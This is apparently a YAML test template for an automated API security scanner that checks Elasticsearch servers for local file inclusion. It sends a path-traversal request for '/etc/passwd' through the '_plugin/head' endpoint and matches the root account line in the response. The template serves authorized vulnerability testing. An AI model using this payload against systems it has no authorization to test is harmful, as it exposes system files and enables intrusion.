id: ELASTICSEARCH_LFI
info:
  name: "Elasticsearch Local File Inclusion"
  description: "Elasticsearch Local File Inclusion (LFI) is a security vulnerability that arises when an Elasticsearch application allows unvalidated user input to specify file paths. If attackers can manipulate these inputs, they may include arbitrary files from the server's filesystem, potentially exposing sensitive information such as configuration files, logs, or user data. This unauthorized access can lead to serious security risks, including information disclosure and further exploitation of the Elasticsearch server. To mitigate this risk, it is crucial to implement strict input validation and prevent the inclusion of user-defined file paths in requests."
  details: "Elasticsearch Local File Inclusion (LFI) occurs when an Elasticsearch instance improperly handles user-supplied input for file paths, allowing attackers to exploit this weakness to include local files from the serverâ€™s filesystem. By crafting malicious requests, attackers can access sensitive files, such as configuration files, environment variables, or logs, which may contain critical information about the system. This unauthorized access can facilitate further attacks, including privilege escalation and data exfiltration. To prevent LFI, developers should enforce stringent input validation, implement file path whitelisting, and follow secure coding practices within the Elasticsearch application."
  impact: "The impact of Elasticsearch Local File Inclusion (LFI) can be significant, as it allows attackers to access sensitive files on the server, leading to potential information disclosure and compromise of the Elasticsearch instance. By exposing critical data such as configuration files, API keys, or user credentials, attackers can leverage this information to escalate privileges, manipulate the system, or launch further attacks on interconnected services. Such breaches can result in reputational damage, financial losses, and regulatory penalties for the organization. Additionally, LFI vulnerabilities may serve as a stepping stone for more advanced attacks, increasing the overall security risk to the application's infrastructure."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: ELASTICSEARCH_LFI
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2021-39433
    - CVE-2023-22973


attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards: compliance/lfi.conf
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
wordLists:
  paths:
    - '/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd'
execute:
  type: single
  requests:
    - req:
        - modify_url: "${paths}"
        - modify_method: GET
        - replace_body: '{}'
validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0
    regex: "root:.*:0:0:"
    not_contains:
      - <html>
      - </html>
strategy:
  run_once: /
